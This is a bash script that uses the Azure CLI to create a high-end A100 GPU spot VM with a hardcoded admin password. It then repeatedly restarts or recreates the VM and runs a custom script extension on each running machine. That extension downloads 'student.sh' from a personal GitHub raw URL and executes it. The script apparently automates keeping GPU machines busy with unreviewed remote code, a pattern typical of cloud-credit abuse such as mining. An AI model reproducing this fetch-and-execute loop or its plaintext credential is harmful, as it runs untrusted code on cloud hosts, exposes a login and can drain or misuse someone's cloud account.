#!/bin/bash
az group create --name Server --location eastus2
az vm create --resource-group Server --name southcentralus --location southcentralus --image Canonical:UbuntuServer:16_04_0-lts-gen2:latest --size Standard_ND96amsr_A100_v4 --admin-username azure --admin-password C@mv@0p0stn3t# --priority Spot --max-price -1 --eviction-policy Deallocate --no-wait
sleep 3m
x=1
while [ $x -le 60 ]
do
  echo "Start vps lan $x"
  az vm start --ids $(az vm list -g Server --query "[?provisioningState == 'Failed' || provisioningState == 'Stopped (deallocated)' || provisioningState == 'Unknown'].id" -o tsv) --no-wait
  echo "Run script lan $x"
  az vm extension set --name customScript --publisher Microsoft.Azure.Extensions --ids $(az vm list -d --query "[?powerState=='VM running'].id" -o tsv) --settings '{"fileUris": ["https://raw.githubusercontent.com/winttr89/2022/main/student.sh"],"commandToExecute": "./student.sh"}'  --no-wait  
  for vps in southcentralus
  do
    if [ "$(az vm list -g Server --query "[?name == '$vps'].id" -o tsv)" = "" ];
    then
      echo "$vps creating..."
	  az vm create --resource-group Server --name $vps --location $vps --image Canonical:UbuntuServer:16_04_0-lts-gen2:latest --size Standard_ND96amsr_A100_v4 --admin-username azure --admin-password C@mv@0p0stn3t# --priority Spot --max-price -1 --eviction-policy Deallocate --no-wait
    else
      echo "$vps was found."
    fi
  done  
  sleep 2m
  x=$(( $x + 1 ))
done
